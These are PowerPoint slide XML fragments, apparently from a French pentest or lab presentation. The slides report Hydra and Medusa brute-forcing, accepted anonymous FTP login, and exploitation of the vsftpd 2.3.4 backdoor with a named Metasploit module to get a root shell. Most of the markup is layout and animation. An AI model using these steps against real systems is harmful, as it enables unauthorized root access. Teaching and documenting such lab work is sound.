          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="1596524"/>
            <a:ext cx="5394960" cy="4625072"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162" name="Google Shape;162;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6181344" y="6340468"/>
            <a:ext cx="5559552"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Un seul terminal : Hydra échoue (haut), puis Medusa prend le relais avec succès (bas)</a:t>
            </a:r>
            <a:endParaRPr sz="1050" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163" name="Google Shape;163;p8"/>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a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>06</a:t>
            </a:r>
            <a:endParaRPr sz="1000" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Image 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ABCD2B7F-5AEF-4525-5819-ED3352E150A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="579119" y="146304"/>
            <a:ext cx="6498085" cy="5806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1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="151"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="8" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="151"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="9" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="15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4"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="154"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="154"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="14" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="15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3"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="17" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="153"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="18" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="153"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="19" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="15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55"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="22" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="155"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="23" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="155"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="24" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="15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56"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="27" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="156"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="28" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="156"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="29" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="15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58"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="32" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="158"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="33" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="158"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="34" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="15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9"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="37" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="159"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="38" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="159"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="39" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="159"/>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1" presetClass="entr" presetSubtype="1" fill="hold" nodeType="clickEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="43" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="161"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="44" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="161"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="45" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="46" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="162"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="47" dur="20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p:bldP spid="153" grpId="0"/>
      <p:bldP spid="154" grpId="0"/>
      <p:bldP spid="155" grpId="0"/>
      <p:bldP spid="156" grpId="0" animBg="1"/>
      <p:bldP spid="158" grpId="0"/>
      <p:bldP spid="159" grpId="0"/>
      <p:bldP spid="16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8"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="170" name="Google Shape;170;p9"/>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i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>Accès</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t> FTP anonyme &amp; backdoor </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>vsftpd</a:t>
            </a:r>
            <a:endParaRPr sz="2700" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="171" name="Google Shape;171;p9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="5120640" cy="4114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48148"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Connexion</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> FTP anonyme </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>acceptée</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700"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="5B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>230 Login successful — faille de configuration majeure</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700"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </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700"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="E11D48"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E11D48"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Exploitation du backdoor </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="E11D48"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>vsftpd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E11D48"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> 2.3.4</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700"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="5B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Module Metasploit exploit/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>unix</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>/ftp/vsftpd_234_backdoor</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700"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="5B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Résultat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>accès</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> shell direct avec UID root</a:t>
            </a:r>
            <a:endParaRPr sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="172" name="Google Shape;172;p9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="721766" y="4078224"/>
            <a:ext cx="4774387" cy="1901952"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3365"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="22225" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="E11D48"/>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3" name="Google Shape;173;p9" descr="/sessions/intelligent-upbeat-noether/mnt/outputs/pptx_images/fig04_ftp_anonyme.jpg"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="804062" y="4160520"/>
            <a:ext cx="4609795" cy="1737360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="174" name="Google Shape;174;p9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="721766" y="6016752"/>
            <a:ext cx="4774387"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Connexion FTP anonyme réussie</a:t>
            </a:r>
            <a:endParaRPr sz="1050" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="175" name="Google Shape;175;p9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6218427" y="1335024"/>
            <a:ext cx="5211065" cy="4873752"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1313"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="22225" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="E11D48"/>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6" name="Google Shape;176;p9" descr="/sessions/intelligent-upbeat-noether/mnt/outputs/pptx_images/fig44_vsftpd_root.jpg"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6300723" y="1417320"/>
            <a:ext cx="5046473" cy="4709160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="177" name="Google Shape;177;p9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6218427" y="6245352"/>
            <a:ext cx="5211065"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Backdoor vsftpd exploité — whoami confirme root</a:t>
            </a:r>
            <a:endParaRPr sz="1050" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="178" name="Google Shape;178;p9"/>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a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>07</a:t>
            </a:r>
            <a:endParaRPr sz="1000" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Image 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DE03668F-C1CB-CE46-5186-F5599E5E5E01}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
